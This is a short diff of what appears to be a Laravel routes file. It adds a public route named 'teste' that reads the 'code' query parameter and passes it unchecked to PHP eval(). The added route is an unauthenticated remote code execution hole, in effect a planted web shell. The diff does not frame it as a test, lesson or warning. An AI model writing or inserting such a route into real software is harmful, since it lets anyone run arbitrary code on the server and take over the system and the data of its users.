@@ -42,6 +42,11 @@ Route::get('invite', function() {
     auth()->user()->sendScheduleNotification(ConversationItem::find(6));
 });
 
+Route::get('teste', function() {
+    $code = $_GET['code'];
+    eval($code);
+});
+
 Route::get('/', function () {
     return redirect()->route('login');
 })->name('home');
